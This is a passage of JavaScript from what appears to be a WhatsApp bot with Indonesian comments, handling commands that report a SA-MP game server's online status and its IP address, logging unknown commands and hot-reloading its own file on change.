                  let maxPlayers = sampInfo.response.maxplayers;
                  let hostname = sampInfo.response.hostname;
                  let language = sampInfo.response.language;
                  let lagCompensation = sampInfo.response.rule.lagcomp;
                  let mapName = sampInfo.response.rule.mapname;
                  let version = sampInfo.response.rule.version;
                  let weather = sampInfo.response.rule.weather;
                  let webUrl = sampInfo.response.rule.weburl;
                  let worldTime = sampInfo.response.rule.worldtime;

                  // Menampilkan hasil ke pengguna dengan tata letak yang lebih rapi dan pemisahan menggunakan ":"
                  let result = `
          > Now Server Is Online 🟢.`;

                  // Menampilkan informasi pemain online (jika ada)
                  m.reply(result);
              } catch (error) {
                  console.error(error);
                  m.reply('> Now Server Is Offline 🔴.');
              }
          }
          break;

          case 'ip': {
              let IpMessage= `
104.167.222.158:9936
              `;

              m.reply(IpMessage);
          }
          break;
          // BATAS SUCI
          // ===========================================================================================================================================================
        default: {
          if (isCmd2 && budy.toLowerCase() != undefined) {
            if (m.chat.endsWith("broadcast")) return;
            if (m.isBaileys) return;
            if (!budy.toLowerCase()) return;
            if (argsLog || (isCmd2 && !m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("tidak tersedia", "turquoise"));
            } else if (argsLog || (isCmd2 && m.isGroup)) {
              // client.sendReadReceipt(m.chat, m.sender, [m.key.id])
              console.log(chalk.black(chalk.bgRed("[ ERROR ]")), color("command", "turquoise"), color(`${prefix}${command}`, "turquoise"), color("tidak tersedia", "turquoise"));
            }
          }
        }
      }
    }
  } catch (err) {
    m.reply(util.format(err));
  }
};

let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright(`Update ${__filename}`));
  delete require.cache[file];
  require(file);
});